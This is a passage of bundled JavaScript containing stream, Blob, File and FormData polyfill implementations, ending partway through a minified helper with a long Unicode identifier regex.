    if (stream._backpressure) {
        // Pretend that pull() was called to permit any pending write() calls to complete. TransformStreamSetBackpressure()
        // cannot be called from enqueue() or pull() once the ReadableStream is errored, so this will will be the final time
        // _backpressure is set.
        TransformStreamSetBackpressure(stream, false);
    }
}
function TransformStreamSetBackpressure(stream, backpressure) {
    // Passes also when called during construction.
    if (stream._backpressureChangePromise !== undefined) {
        stream._backpressureChangePromise_resolve();
    }
    stream._backpressureChangePromise = newPromise(resolve => {
        stream._backpressureChangePromise_resolve = resolve;
    });
    stream._backpressure = backpressure;
}
// Class TransformStreamDefaultController
/**
 * Allows control of the {@link ReadableStream} and {@link WritableStream} of the associated {@link TransformStream}.
 *
 * @public
 */
class TransformStreamDefaultController {
    constructor() {
        throw new TypeError('Illegal constructor');
    }
    /**
     * Returns the desired size to fill the readable side’s internal queue. It can be negative, if the queue is over-full.
     */
    get desiredSize() {
        if (!IsTransformStreamDefaultController(this)) {
            throw defaultControllerBrandCheckException('desiredSize');
        }
        const readableController = this._controlledTransformStream._readable._readableStreamController;
        return ReadableStreamDefaultControllerGetDesiredSize(readableController);
    }
    enqueue(chunk = undefined) {
        if (!IsTransformStreamDefaultController(this)) {
            throw defaultControllerBrandCheckException('enqueue');
        }
        TransformStreamDefaultControllerEnqueue(this, chunk);
    }
    /**
     * Errors both the readable side and the writable side of the controlled transform stream, making all future
     * interactions with it fail with the given error `e`. Any chunks queued for transformation will be discarded.
     */
    error(reason = undefined) {
        if (!IsTransformStreamDefaultController(this)) {
            throw defaultControllerBrandCheckException('error');
        }
        TransformStreamDefaultControllerError(this, reason);
    }
    /**
     * Closes the readable side and errors the writable side of the controlled transform stream. This is useful when the
     * transformer only needs to consume a portion of the chunks written to the writable side.
     */
    terminate() {
        if (!IsTransformStreamDefaultController(this)) {
            throw defaultControllerBrandCheckException('terminate');
        }
        TransformStreamDefaultControllerTerminate(this);
    }
}
Object.defineProperties(TransformStreamDefaultController.prototype, {
    enqueue: { enumerable: true },
    error: { enumerable: true },
    terminate: { enumerable: true },
    desiredSize: { enumerable: true }
});
// Transform Stream Default Controller Abstract Operations
function IsTransformStreamDefaultController(x) {
    if (!typeIsObject(x)) {
        return false;
    }
    if (!Object.prototype.hasOwnProperty.call(x, '_controlledTransformStream')) {
        return false;
    }
    return x instanceof TransformStreamDefaultController;
}
function SetUpTransformStreamDefaultController(stream, controller, transformAlgorithm, flushAlgorithm) {
    controller._controlledTransformStream = stream;
    stream._transformStreamController = controller;
    controller._transformAlgorithm = transformAlgorithm;
    controller._flushAlgorithm = flushAlgorithm;
}
function SetUpTransformStreamDefaultControllerFromTransformer(stream, transformer) {
    const controller = Object.create(TransformStreamDefaultController.prototype);
    let transformAlgorithm = (chunk) => {
        try {
            TransformStreamDefaultControllerEnqueue(controller, chunk);
            return promiseResolvedWith(undefined);
        }
        catch (transformResultE) {
            return promiseRejectedWith(transformResultE);
        }
    };
    let flushAlgorithm = () => promiseResolvedWith(undefined);
    if (transformer.transform !== undefined) {
        transformAlgorithm = chunk => transformer.transform(chunk, controller);
    }
    if (transformer.flush !== undefined) {
        flushAlgorithm = () => transformer.flush(controller);
    }
    SetUpTransformStreamDefaultController(stream, controller, transformAlgorithm, flushAlgorithm);
}
function TransformStreamDefaultControllerClearAlgorithms(controller) {
    controller._transformAlgorithm = undefined;
    controller._flushAlgorithm = undefined;
}
function TransformStreamDefaultControllerEnqueue(controller, chunk) {
    const stream = controller._controlledTransformStream;
    const readableController = stream._readable._readableStreamController;
    if (!ReadableStreamDefaultControllerCanCloseOrEnqueue(readableController)) {
        throw new TypeError('Readable side is not in a state that permits enqueue');
    }
    // We throttle transform invocations based on the backpressure of the ReadableStream, but we still
    // accept TransformStreamDefaultControllerEnqueue() calls.
    try {
        ReadableStreamDefaultControllerEnqueue(readableController, chunk);
    }
    catch (e) {
        // This happens when readableStrategy.size() throws.
        TransformStreamErrorWritableAndUnblockWrite(stream, e);
        throw stream._readable._storedError;
    }
    const backpressure = ReadableStreamDefaultControllerHasBackpressure(readableController);
    if (backpressure !== stream._backpressure) {
        TransformStreamSetBackpressure(stream, true);
    }
}
function TransformStreamDefaultControllerError(controller, e) {
    TransformStreamError(controller._controlledTransformStream, e);
}
function TransformStreamDefaultControllerPerformTransform(controller, chunk) {
    const transformPromise = controller._transformAlgorithm(chunk);
    return transformPromiseWith(transformPromise, undefined, r => {
        TransformStreamError(controller._controlledTransformStream, r);
        throw r;
    });
}
function TransformStreamDefaultControllerTerminate(controller) {
    const stream = controller._controlledTransformStream;
    const readableController = stream._readable._readableStreamController;
    ReadableStreamDefaultControllerClose(readableController);
    const error = new TypeError('TransformStream terminated');
    TransformStreamErrorWritableAndUnblockWrite(stream, error);
}
// TransformStreamDefaultSink Algorithms
function TransformStreamDefaultSinkWriteAlgorithm(stream, chunk) {
    const controller = stream._transformStreamController;
    if (stream._backpressure) {
        const backpressureChangePromise = stream._backpressureChangePromise;
        return transformPromiseWith(backpressureChangePromise, () => {
            const writable = stream._writable;
            const state = writable._state;
            if (state === 'erroring') {
                throw writable._storedError;
            }
            return TransformStreamDefaultControllerPerformTransform(controller, chunk);
        });
    }
    return TransformStreamDefaultControllerPerformTransform(controller, chunk);
}
function TransformStreamDefaultSinkAbortAlgorithm(stream, reason) {
    // abort() is not called synchronously, so it is possible for abort() to be called when the stream is already
    // errored.
    TransformStreamError(stream, reason);
    return promiseResolvedWith(undefined);
}
function TransformStreamDefaultSinkCloseAlgorithm(stream) {
    // stream._readable cannot change after construction, so caching it across a call to user code is safe.
    const readable = stream._readable;
    const controller = stream._transformStreamController;
    const flushPromise = controller._flushAlgorithm();
    TransformStreamDefaultControllerClearAlgorithms(controller);
    // Return a promise that is fulfilled with undefined on success.
    return transformPromiseWith(flushPromise, () => {
        if (readable._state === 'errored') {
            throw readable._storedError;
        }
        ReadableStreamDefaultControllerClose(readable._readableStreamController);
    }, r => {
        TransformStreamError(stream, r);
        throw readable._storedError;
    });
}
// TransformStreamDefaultSource Algorithms
function TransformStreamDefaultSourcePullAlgorithm(stream) {
    // Invariant. Enforced by the promises returned by start() and pull().
    TransformStreamSetBackpressure(stream, false);
    // Prevent the next pull() call until there is backpressure.
    return stream._backpressureChangePromise;
}
// Helper functions for the TransformStreamDefaultController.
function defaultControllerBrandCheckException(name) {
    return new TypeError(`TransformStreamDefaultController.prototype.${name} can only be used on a TransformStreamDefaultController`);
}
// Helper functions for the TransformStream.
function streamBrandCheckException(name) {
    return new TypeError(`TransformStream.prototype.${name} can only be used on a TransformStream`);
}

/* c8 ignore start */
// 64 KiB (same size chrome slice theirs blob into Uint8array's)
const POOL_SIZE$1 = 65536;


try {
  // Don't use node: prefix for this, require+node: is not supported until node v14.14
  // Only `import()` can use prefix in 12.20 and later
  const { Blob } = require('buffer');
  if (Blob && !Blob.prototype.stream) {
    Blob.prototype.stream = function name (params) {
      let position = 0;
      const blob = this;

      return new ReadableStream$1({
        type: 'bytes',
        async pull (ctrl) {
          const chunk = blob.slice(position, Math.min(blob.size, position + POOL_SIZE$1));
          const buffer = await chunk.arrayBuffer();
          position += buffer.byteLength;
          ctrl.enqueue(new Uint8Array(buffer));

          if (position === blob.size) {
            ctrl.close();
          }
        }
      })
    };
  }
} catch (error) {}
/* c8 ignore end */

// 64 KiB (same size chrome slice theirs blob into Uint8array's)
const POOL_SIZE = 65536;

/** @param {(Blob | Uint8Array)[]} parts */
async function * toIterator (parts, clone = true) {
  for (const part of parts) {
    if ('stream' in part) {
      yield * (/** @type {AsyncIterableIterator<Uint8Array>} */ (part.stream()));
    } else if (ArrayBuffer.isView(part)) {
      if (clone) {
        let position = part.byteOffset;
        const end = part.byteOffset + part.byteLength;
        while (position !== end) {
          const size = Math.min(end - position, POOL_SIZE);
          const chunk = part.buffer.slice(position, position + size);
          position += chunk.byteLength;
          yield new Uint8Array(chunk);
        }
      } else {
        yield part;
      }
    /* c8 ignore next 10 */
    } else {
      // For blobs that have arrayBuffer but no stream method (nodes buffer.Blob)
      let position = 0, b = (/** @type {Blob} */ (part));
      while (position !== b.size) {
        const chunk = b.slice(position, Math.min(b.size, position + POOL_SIZE));
        const buffer = await chunk.arrayBuffer();
        position += buffer.byteLength;
        yield new Uint8Array(buffer);
      }
    }
  }
}

const _Blob = class Blob {
  /** @type {Array.<(Blob|Uint8Array)>} */
  #parts = []
  #type = ''
  #size = 0
  #endings = 'transparent'

  /**
   * The Blob() constructor returns a new Blob object. The content
   * of the blob consists of the concatenation of the values given
   * in the parameter array.
   *
   * @param {*} blobParts
   * @param {{ type?: string, endings?: string }} [options]
   */
  constructor (blobParts = [], options = {}) {
    if (typeof blobParts !== 'object' || blobParts === null) {
      throw new TypeError('Failed to construct \'Blob\': The provided value cannot be converted to a sequence.')
    }

    if (typeof blobParts[Symbol.iterator] !== 'function') {
      throw new TypeError('Failed to construct \'Blob\': The object must have a callable @@iterator property.')
    }

    if (typeof options !== 'object' && typeof options !== 'function') {
      throw new TypeError('Failed to construct \'Blob\': parameter 2 cannot convert to dictionary.')
    }

    if (options === null) options = {};

    const encoder = new TextEncoder();
    for (const element of blobParts) {
      let part;
      if (ArrayBuffer.isView(element)) {
        part = new Uint8Array(element.buffer.slice(element.byteOffset, element.byteOffset + element.byteLength));
      } else if (element instanceof ArrayBuffer) {
        part = new Uint8Array(element.slice(0));
      } else if (element instanceof Blob) {
        part = element;
      } else {
        part = encoder.encode(`${element}`);
      }

      this.#size += ArrayBuffer.isView(part) ? part.byteLength : part.size;
      this.#parts.push(part);
    }

    this.#endings = `${options.endings === undefined ? 'transparent' : options.endings}`;
    const type = options.type === undefined ? '' : String(options.type);
    this.#type = /^[\x20-\x7E]*$/.test(type) ? type : '';
  }

  /**
   * The Blob interface's size property returns the
   * size of the Blob in bytes.
   */
  get size () {
    return this.#size
  }

  /**
   * The type property of a Blob object returns the MIME type of the file.
   */
  get type () {
    return this.#type
  }

  /**
   * The text() method in the Blob interface returns a Promise
   * that resolves with a string containing the contents of
   * the blob, interpreted as UTF-8.
   *
   * @return {Promise<string>}
   */
  async text () {
    // More optimized than using this.arrayBuffer()
    // that requires twice as much ram
    const decoder = new TextDecoder();
    let str = '';
    for await (const part of toIterator(this.#parts, false)) {
      str += decoder.decode(part, { stream: true });
    }
    // Remaining
    str += decoder.decode();
    return str
  }

  /**
   * The arrayBuffer() method in the Blob interface returns a
   * Promise that resolves with the contents of the blob as
   * binary data contained in an ArrayBuffer.
   *
   * @return {Promise<ArrayBuffer>}
   */
  async arrayBuffer () {
    // Easier way... Just a unnecessary overhead
    // const view = new Uint8Array(this.size);
    // await this.stream().getReader({mode: 'byob'}).read(view);
    // return view.buffer;

    const data = new Uint8Array(this.size);
    let offset = 0;
    for await (const chunk of toIterator(this.#parts, false)) {
      data.set(chunk, offset);
      offset += chunk.length;
    }

    return data.buffer
  }

  stream () {
    const it = toIterator(this.#parts, true);

    return new ReadableStream$1({
      // @ts-ignore
      type: 'bytes',
      async pull (ctrl) {
        const chunk = await it.next();
        chunk.done ? ctrl.close() : ctrl.enqueue(chunk.value);
      },

      async cancel () {
        await it.return();
      }
    })
  }

  /**
   * The Blob interface's slice() method creates and returns a
   * new Blob object which contains data from a subset of the
   * blob on which it's called.
   *
   * @param {number} [start]
   * @param {number} [end]
   * @param {string} [type]
   */
  slice (start = 0, end = this.size, type = '') {
    const { size } = this;

    let relativeStart = start < 0 ? Math.max(size + start, 0) : Math.min(start, size);
    let relativeEnd = end < 0 ? Math.max(size + end, 0) : Math.min(end, size);

    const span = Math.max(relativeEnd - relativeStart, 0);
    const parts = this.#parts;
    const blobParts = [];
    let added = 0;

    for (const part of parts) {
      // don't add the overflow to new blobParts
      if (added >= span) {
        break
      }

      const size = ArrayBuffer.isView(part) ? part.byteLength : part.size;
      if (relativeStart && size <= relativeStart) {
        // Skip the beginning and change the relative
        // start & end position as we skip the unwanted parts
        relativeStart -= size;
        relativeEnd -= size;
      } else {
        let chunk;
        if (ArrayBuffer.isView(part)) {
          chunk = part.subarray(relativeStart, Math.min(size, relativeEnd));
          added += chunk.byteLength;
        } else {
          chunk = part.slice(relativeStart, Math.min(size, relativeEnd));
          added += chunk.size;
        }
        relativeEnd -= size;
        blobParts.push(chunk);
        relativeStart = 0; // All next sequential parts should start at 0
      }
    }

    const blob = new Blob([], { type: String(type).toLowerCase() });
    blob.#size = span;
    blob.#parts = blobParts;

    return blob
  }

  get [Symbol.toStringTag] () {
    return 'Blob'
  }

  static [Symbol.hasInstance] (object) {
    return (
      object &&
      typeof object === 'object' &&
      typeof object.constructor === 'function' &&
      (
        typeof object.stream === 'function' ||
        typeof object.arrayBuffer === 'function'
      ) &&
      /^(Blob|File)$/.test(object[Symbol.toStringTag])
    )
  }
};

Object.defineProperties(_Blob.prototype, {
  size: { enumerable: true },
  type: { enumerable: true },
  slice: { enumerable: true }
});

/** @type {typeof globalThis.Blob} */
const Blob = _Blob;

const _File = class File extends Blob {
  #lastModified = 0
  #name = ''

  /**
   * @param {*[]} fileBits
   * @param {string} fileName
   * @param {{lastModified?: number, type?: string}} options
   */// @ts-ignore
  constructor (fileBits, fileName, options = {}) {
    if (arguments.length < 2) {
      throw new TypeError(`Failed to construct 'File': 2 arguments required, but only ${arguments.length} present.`)
    }
    super(fileBits, options);

    if (options === null) options = {};

    // Simulate WebIDL type casting for NaN value in lastModified option.
    const lastModified = options.lastModified === undefined ? Date.now() : Number(options.lastModified);
    if (!Number.isNaN(lastModified)) {
      this.#lastModified = lastModified;
    }

    this.#name = String(fileName);
  }

  get name () {
    return this.#name
  }

  get lastModified () {
    return this.#lastModified
  }

  get [Symbol.toStringTag] () {
    return 'File'
  }

  static [Symbol.hasInstance] (object) {
    return !!object && object instanceof Blob &&
      /^(File)$/.test(object[Symbol.toStringTag])
  }
};

/** @type {typeof globalThis.File} */// @ts-ignore
const File = _File;

/*! formdata-polyfill. MIT License. Jimmy Wärting <https://jimmy.warting.se/opensource> */

var {toStringTag:t$1,iterator:i$1,hasInstance:h$1}=Symbol,
m$1='append,set,get,getAll,delete,keys,values,entries,forEach,constructor'.split(','),
f$1=(a,b,c)=>(a+='',/^(Blob|File)$/.test(b && b[t$1])?[(c=c!==void 0?c+'':b[t$1]=='File'?b.name:'blob',a),b.name!==c||b[t$1]=='blob'?new File([b],c,b):b]:[a,b+'']),
x$1=(n, a, e)=>{if(a.length<e){throw new TypeError(`Failed to execute '${n}' on 'FormData': ${e} arguments required, but only ${a.length} present.`)}};

/** @type {typeof globalThis.FormData} */
const FormData = class FormData {
#d=[];
constructor(...a){if(a.length)throw new TypeError(`Failed to construct 'FormData': parameter 1 is not of type 'HTMLFormElement'.`)}
get [t$1]() {return 'FormData'}
[i$1](){return this.entries()}
static [h$1](o) {return o&&typeof o==='object'&&o[t$1]==='FormData'&&!m$1.some(m=>typeof o[m]!='function')}
append(...a){x$1('append',arguments,2);this.#d.push(f$1(...a));}
delete(a){x$1('delete',arguments,1);a+='';this.#d=this.#d.filter(([b])=>b!==a);}
get(a){x$1('get',arguments,1);a+='';for(var b=this.#d,l=b.length,c=0;c<l;c++)if(b[c][0]===a)return b[c][1];return null}
getAll(a,b){x$1('getAll',arguments,1);b=[];a+='';this.#d.forEach(c=>c[0]===a&&b.push(c[1]));return b}
has(a){x$1('has',arguments,1);a+='';return this.#d.some(b=>b[0]===a)}
forEach(a,b){x$1('forEach',arguments,1);for(var [c,d]of this)a.call(b,d,c,this);}
set(...a){x$1('set',arguments,2);var b=[],c=!0;a=f$1(...a);this.#d.forEach(d=>{d[0]===a[0]?c&&(c=!b.push(a)):b.push(d);});c&&b.push(a);this.#d=b;}
*entries(){yield*this.#d;}
*keys(){for(var[a]of this)yield a;}
*values(){for(var[,a]of this)yield a;}};

function u(u,D){for(var t=0;t<D.length;t++){var F=D[t];F.enumerable=F.enumerable||!1,F.configurable=!0,"value"in F&&(F.writable=!0),Object.defineProperty(u,F.key,F);}}function D(D,t,F){return t&&u(D.prototype,t),F&&u(D,F),D}function t(u,D){(null==D||D>u.length)&&(D=u.length);for(var t=0,F=new Array(D);t<D;t++)F[t]=u[t];return F}function F(u,D){var F="undefined"!=typeof Symbol&&u[Symbol.iterator]||u["@@iterator"];if(F)return (F=F.call(u)).next.bind(F);if(Array.isArray(u)||(F=function(u,D){if(u){if("string"==typeof u)return t(u,D);var F=Object.prototype.toString.call(u).slice(8,-1);return "Object"===F&&u.constructor&&(F=u.constructor.name),"Map"===F||"Set"===F?Array.from(u):"Arguments"===F||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(F)?t(u,D):void 0}}(u))||D&&u&&"number"==typeof u.length){F&&(u=F);var e=0;return function(){return e>=u.length?{done:!0}:{done:!1,value:u[e++]}}}throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}var e=/(?:[\$A-Z_a-z\xAA\xB5\xBA\xC0-\xD6\xD8-\xF6\xF8-\u02C1\u02C6-\u02D1\u02E0-\u02E4\u02EC\u02EE\u0370-\u0374\u0376\u0377\u037A-\u037D\u037F\u0386\u0388-\u038A\u038C\u038E-\u03A1\u03A3-\u03F5\u03F7-\u0481\u048A-\u052F\u0531-\u0556\u0559\u0560-\u0588\u05D0-\u05EA\u05EF-\u05F2\u0620-\u064A\u066E\u066F\u0671-\u06D3\u06D5\u06E5\u06E6\u06EE\u06EF\u06FA-\u06FC\u06FF\u0710\u0712-\u072F\u074D-\u07A5\u07B1\u07CA-\u07EA\u07F4\u07F5\u07FA\u0800-\u0815\u081A\u0824\u0828\u0840-\u0858\u0860-\u086A\u08A0-\u08B4\u08B6-\u08C7\u0904-\u0939\u093D\u0950\u0958-\u0961\u0971-\u0980\u0985-\u098C\u098F\u0990\u0993-\u09A8\u09AA-\u09B0\u09B2\u09B6-\u09B9\u09BD\u09CE\u09DC\u09DD\u09DF-\u09E1\u09F0\u09F1\u09FC\u0A05-\u0A0A\u0A0F\u0A10\u0A13-\u0A28\u0A2A-\u0A30\u0A32\u0A33\u0A35\u0A36\u0A38\u0A39\u0A59-\u0A5C\u0A5E\u0A72-\u0A74\u0A85-\u0A8D\u0A8F-\u0A91\u0A93-\u0AA8\u0AAA-\u0AB0\u0AB2\u0AB3\u0AB5-\u0AB9\u0ABD\u0AD0\u0AE0\u0AE1\u0AF9\u0B05-\u0B0C\u0B0F\u0B10\u0B13-\u0B28\u0B2A-\u0B30\u0B32\u0B33\u0B35-\u0B39\u0B3D\u0B5C\u0B5D\u0B5F-\u0B61\u0B71\u0B83\u0B85-\u0B8A\u0B8E-\u0B90\u0B92-\u0B95\u0B99\u0B9A\u0B9C\u0B9E\u0B9F\u0BA3\u0BA4\u0BA8-\u0BAA\u0BAE-\u0BB9\u0BD0\u0C05-\u0C0C\u0C0E-\u0C10\u0C12-\u0C28\u0C2A-\u0C39\u0C3D\u0C58-\u0C5A\u0C60\u0C61\u0C80\u0C85-\u0C8C\u0C8E-\u0C90\u0C92-\u0CA8\u0CAA-\u0CB3\u0CB5-\u0CB9\u0CBD\u0CDE\u0CE0\u0CE1\u0CF1\u0CF2\u0D04-\u0D0C\u0D0E-\u0D10\u0D12-\u0D3A\u0D3D\u0D4E\u0D54-\u0D56\u0D5F-\u0D61\u0D7A-\u0D7F\u0D85-\u0D96\u0D9A-\u0DB1\u0DB3-\u0DBB\u0DBD\u0DC0-\u0DC6\u0E01-\u0E30\u0E32\u0E33\u0E40-\u0E46\u0E81\u0E82\u0E84\u0E86-\u0E8A\u0E8C-\u0EA3\u0EA5\u0EA7-\u0EB0\u0EB2\u0EB3\u0EBD\u0EC0-\u0EC4\u0EC6\u0EDC-\u0EDF\u0F00\u0F40-\u0F47\u0F49-\u0F6C\u0F88-\u0F8C\u1000-\u102A\u103F\u1050-\u1055\u105A-\u105D\u1061\u1065\u1066\u106E-\u1070\u1075-\u1081\u108E\u10A0-\u10C5\u10C7\u10CD\u10D0-\u10FA\u10FC-\u1248\u124A-\u124D\u1250-\u1256\u1258\u125A-\u125D\u1260-\u1288\u128A-\u128D\u1290-\u12B0\u12B2-\u12B5\u12B8-\u12BE\u12C0\u12C2-\u12C5\u12C8-\u12D6\u12D8-\u1310\u1312-\u1315\u1318-\u135A\u1380-\u138F\u13A0-\u13F5\u13F8-\u13FD\u1401-\u166C\u166F-\u167F\u1681-\u169A\u16A0-\u16EA\u16EE-\u16F8\u1700-\u170C\u170E-\u1711\u1720-\u1731\u1740-\u1751\u1760-\u176C\u176E-\u1770\u1780-\u17B3\u17D7\u17DC\u1820-\u1878\u1880-\u18A8\u18AA\u18B0-\u18F5\u1900-\u191E\u1950-\u196D\u1970-\u1974\u1980-\u19AB\u19B0-\u19C9\u1A00-\u1A16\u1A20-\u1A54\u1AA7\u1B05-\u1B33\u1B45-\u1B4B\u1B83-\u1BA0\u1BAE\u1BAF\u1BBA-\u1BE5\u1C00-\u1C23\u1C4D-\u1C4F\u1C5A-\u1C7D\u1C80-\u1C88\u1C90-\u1CBA\u1CBD-\u1CBF\u1CE9-\u1CEC\u1CEE-\u1CF3\u1CF5\u1CF6\u1CFA\u1D00-\u1DBF\u1E00-\u1F15\u1F18-\u1F1D\u1F20-\u1F45\u1F48-\u1F4D\u1F50-\u1F57\u1F59\u1F5B\u1F5D\u1F5F-\u1F7D\u1F80-\u1FB4\u1FB6-\u1FBC\u1FBE\u1FC2-\u1FC4\u1FC6-\u1FCC\u1FD0-\u1FD3\u1FD6-\u1FDB\u1FE0-\u1FEC\u1FF2-\u1FF4\u1FF6-\u1FFC\u2071\u207F\u2090-\u209C\u2102\u2107\u210A-\u2113\u2115\u2118-\u211D\u2124\u2126\u2128\u212A-\u2139\u213C-\u213F\u2145-\u2149\u214E\u2160-\u2188\u2C00-\u2C2E\u2C30-\u2C5E\u2C60-\u2CE4\u2CEB-\u2CEE\u2CF2\u2CF3\u2D00-\u2D25\u2D27\u2D2D\u2D30-\u2D67\u2D6F\u2D80-\u2D96\u2DA0-\u2DA6\u2DA8-\u2DAE\u2DB0-\u2DB6\u2DB8-\u2DBE\u2DC0-\u2DC6\u2DC8-\u2DCE\u2DD0-\u2DD6\u2DD8-\u2DDE\u3005-\u3007\u3021-\u3029\u3031-\u3035\u3038-\u303C\u3041-\u3096\u309B-\u309F\u30A1-\u30FA\u30FC-\u30FF\u3105-\u312F\u3131-\u318E\u31A0-\u31BF\u31F0-\u31FF\u3400-\u4DBF\u4E00-\u9FFC\uA000-\uA48C\uA4D0-\uA4FD\uA500-\uA60C\uA610-\uA61F\uA62A\uA62B\uA640-\uA66E\uA67F-\uA69D\uA6A0-\uA6EF\uA717-\uA71F\uA722-\uA788\uA78B-\uA7BF\uA7C2-\uA7CA\uA7F5-\uA801\uA803-\uA805\uA807-\uA80A\uA80C-\uA822\uA840-\uA873\uA882-\uA8B3\uA8F2-\uA8F7\uA8FB\uA8FD\uA8FE\uA90A-\uA925\uA930-\uA946\uA960-\uA97C\uA984-\uA9B2\uA9CF\uA9E0-\uA9E4\uA9E6-\uA9EF\uA9FA-\uA9FE\uAA00-\uAA28\uAA40-\uAA42\uAA44-\uAA4B\uAA60-\uAA76\uAA7A\uAA7E-\uAAAF\uAAB1\uAAB5\uAAB6\uAAB9-\uAABD\uAAC0\uAAC2\uAADB-\uAADD\uAAE0-\uAAEA\uAAF2-\uAAF4\uAB01-\uAB06\uAB09-\uAB0E\uAB11-\uAB16\uAB20-\uAB26\uAB28-\uAB2E\uAB30-\uAB5A\uAB5C-\uAB69\uAB70-\uABE2\uAC00-\uD7A3\uD7B0-\uD7C6\uD7CB-\uD7FB\uF900-\uFA6D\uFA70-\uFAD9\uFB00-\uFB06\uFB13-\uFB17\uFB1D\uFB1F-\uFB28\uFB2A-\uFB36\uFB38-\uFB3C\uFB3E\uFB40\uFB41\uFB43\uFB44\uFB46-\uFBB1\uFBD3-\uFD3D\uFD50-\uFD8F\uFD92-\uFDC7\uFDF0-\uFDFB\uFE70-\uFE74\uFE76-\uFEFC\uFF21-\uFF3A\uFF41-\uFF5A\uFF66-\uFFBE\uFFC2-\uFFC7\uFFCA-\uFFCF\uFFD2-\uFFD7\uFFDA-\uFFDC]|\uD800[\uDC00-\uDC0B\uDC0D-\uDC26\uDC28-\uDC3A\uDC3C\uDC3D\uDC3F-\uDC4D\uDC50-\uDC5D\uDC80-\uDCFA\uDD40-\uDD74\uDE80-\uDE9C\uDEA0-\uDED0\uDF00-\uDF1F\uDF2D-\uDF4A\uDF50-\uDF75\uDF80-\uDF9D\uDFA0-\uDFC3\uDFC8-\uDFCF\uDFD1-\uDFD5]|\uD801[\uDC00-\uDC9D\uDCB0-\uDCD3\uDCD8-\uDCFB\uDD00-\uDD27\uDD30-\uDD63\uDE00-\uDF36\uDF40-\uDF55\uDF60-\uDF67]|\uD802[\uDC00-\uDC05\uDC08\uDC0A-\uDC35\uDC37\uDC38\uDC3C\uDC3F-\uDC55\uDC60-\uDC76\uDC80-\uDC9E\uDCE0-\uDCF2\uDCF4\uDCF5\uDD00-\uDD15\uDD20-\uDD39\uDD80-\uDDB7\uDDBE\uDDBF\uDE00\uDE10-\uDE13\uDE15-\uDE17\uDE19-\uDE35\uDE60-\uDE7C\uDE80-\uDE9C\uDEC0-\uDEC7\uDEC9-\uDEE4\uDF00-\uDF35\uDF40-\uDF55\uDF60-\uDF72\uDF80-\uDF91]|\uD803[\uDC00-\uDC48\uDC80-\uDCB2\uDCC0-\uDCF2\uDD00-\uDD23\uDE80-\uDEA9\uDEB0\uDEB1\uDF00-\uDF1C\uDF27\uDF30-\uDF45\uDFB0-\uDFC4\uDFE0-\uDFF6]|\uD804[\uDC03-\uDC37\uDC83-\uDCAF\uDCD0-\uDCE8\uDD03-\uDD26\uDD44\uDD47\uDD50-\uDD72\uDD76\uDD83-\uDDB2\uDDC1-\uDDC4\uDDDA\uDDDC\uDE00-\uDE11\uDE13-\uDE2B\uDE80-\uDE86\uDE88\uDE8A-\uDE8D\uDE8F-\uDE9D\uDE9F-\uDEA8\uDEB0-\uDEDE\uDF05-\uDF0C\uDF0F\uDF10\uDF13-\uDF28\uDF2A-\uDF30\uDF32\uDF33\uDF35-\uDF39\uDF3D\uDF50\uDF5D-\uDF61]|\uD805[\uDC00-\uDC34\uDC47-\uDC4A\uDC5F-\uDC61\uDC80-\uDCAF\uDCC4\uDCC5\uDCC7\uDD80-\uDDAE\uDDD8-\uDDDB\uDE00-\uDE2F\uDE44\uDE80-\uDEAA\uDEB8\uDF00-\uDF1A]|\uD806[\uDC00-\uDC2B\uDCA0-\uDCDF\uDCFF-\uDD06\uDD09\uDD0C-\uDD13\uDD15\uDD16\uDD18-\uDD2F\uDD3F\uDD41\uDDA0-\uDDA7\uDDAA-\uDDD0\uDDE1\uDDE3\uDE00\uDE0B-\uDE32\uDE3A\uDE50\uDE5C-\uDE89\uDE9D\uDEC0-\uDEF8]|\uD807[\uDC00-\uDC08\uDC0A-\uDC2E\uDC40\uDC72-\uDC8F\uDD00-\uDD06\uDD08\uDD09\uDD0B-\uDD30\uDD46\uDD60-\uDD65\uDD67\uDD68\uDD6A-\uDD89\uDD98\uDEE0-\uDEF2\uDFB0]|\uD808[\uDC00-\uDF99]|\uD809[\uDC00-\uDC6E\uDC80-\uDD43]|[\uD80C\uD81C-\uD820\uD822\uD840-\uD868\uD86A-\uD86C\uD86F-\uD872\uD874-\uD879\uD880-\uD883][\uDC00-\uDFFF]|\uD80D[\uDC00-\uDC2E]|\uD811[\uDC00-\uDE46]|\uD81A[\uDC00-\uDE38\uDE40-\uDE5E\uDED0-\uDEED\uDF00-\uDF2F\uDF40-\uDF43\uDF63-\uDF77\uDF7D-\uDF8F]|\uD81B[\uDE40-\uDE7F\uDF00-\uDF4A\uDF50\uDF93-\uDF9F\uDFE0\uDFE1\uDFE3]|\uD821[\uDC00-\uDFF7]|\uD823[\uDC00-\uDCD5\uDD00-\uDD08]|\uD82C[\uDC00-\uDD1E\uDD50-\uDD52\uDD64-\uDD67\uDD70-\uDEFB]|\uD82F[\uDC00-\uDC6A\uDC70-\uDC7C\uDC80-\uDC88\uDC90-\uDC99]|\uD835[\uDC00-\uDC54\uDC56-\uDC9C\uDC9E\uDC9F\uDCA2\uDCA5\uDCA6\uDCA9-\uDCAC\uDCAE-\uDCB9\uDCBB\uDCBD-\uDCC3\uDCC5-\uDD05\uDD07-\uDD0A\uDD0D-\uDD14\uDD16-\uDD1C\uDD1E-\uDD39\uDD3B-\uDD3E\uDD40-\uDD44\uDD46\uDD4A-\uDD50\uDD52-\uDEA5\uDEA8-\uDEC0\uDEC2-\uDEDA\uDEDC-\uDEFA\uDEFC-\uDF14\uDF16-\uDF34\uDF36-\uDF4E\uDF50-\uDF6E\uDF70-\uDF88\uDF8A-\uDFA8\uDFAA-\uDFC2\uDFC4-\uDFCB]|\uD838[\uDD00-\uDD2C\uDD37-\uDD3D\uDD4E\uDEC0-\uDEEB]|\uD83A[\uDC00-\uDCC4\uDD00-\uDD43\uDD4B]|\uD83B[\uDE00-\uDE03\uDE05-\uDE1F\uDE21\uDE22\uDE24\uDE27\uDE29-\uDE32\uDE34-\uDE37\uDE39\uDE3B\uDE42\uDE47\uDE49\uDE4B\uDE4D-\uDE4F\uDE51\uDE52\uDE54\uDE57\uDE59\uDE5B\uDE5D\uDE5F\uDE61\uDE62\uDE64\uDE67-\uDE6A\uDE6C-\uDE72\uDE74-\uDE77\uDE79-\uDE7C\uDE7E\uDE80-\uDE89\uDE8B-\uDE9B\uDEA1-\uDEA3\uDEA5-\uDEA9\uDEAB-\uDEBB]|\uD869[\uDC00-\uDEDD\uDF00-\uDFFF]|\uD86D[\uDC00-\uDF34\uDF40-\uDFFF]|\uD86E[\uDC00-\uDC1D\uDC20-\uD